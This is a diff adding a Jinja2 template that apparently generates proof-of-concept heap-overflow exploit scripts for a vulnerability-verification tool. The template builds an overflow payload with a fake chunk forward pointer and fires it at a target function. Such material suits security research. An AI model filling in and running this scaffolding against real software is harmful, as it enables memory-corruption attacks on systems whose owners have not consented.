@@ -1,0 +1,27 @@
+{% extends "poc/base.py.j2" %}
+
+{% block description %}Heap overflow in {{ sink_api }}{% endblock %}
+
+{% block config %}
+CHUNK_SIZE = {{ buffer_size | default(128) }}
+{% endblock %}
+
+{% block payload %}
+# Heap overflow payload
+payload = b'A' * CHUNK_SIZE           # Fill chunk
+payload += b'B' * 64                  # Overflow into adjacent chunk header
+payload += struct.pack('<Q', 0x4141414141414141)  # Fake FD pointer
+{% endblock %}
+
+{% block exploit_doc %}Execute heap overflow exploit{% endblock %}
+
+{% block exploit_body %}
+        print(f"[*] Sink API: {{ sink_api }}")
+        print(f"[*] Expected chunk size: {CHUNK_SIZE}")
+        print(f"[*] Payload size: {len(payload)} bytes")
+
+        print("[*] Triggering heap overflow...")
+        args = arg_builder.build(payload, payload_arg_idx={{ tainted_arg | default(0) }})
+        result = func(*args)
+        print(f"[+] Function returned: {result}")
+{% endblock %}
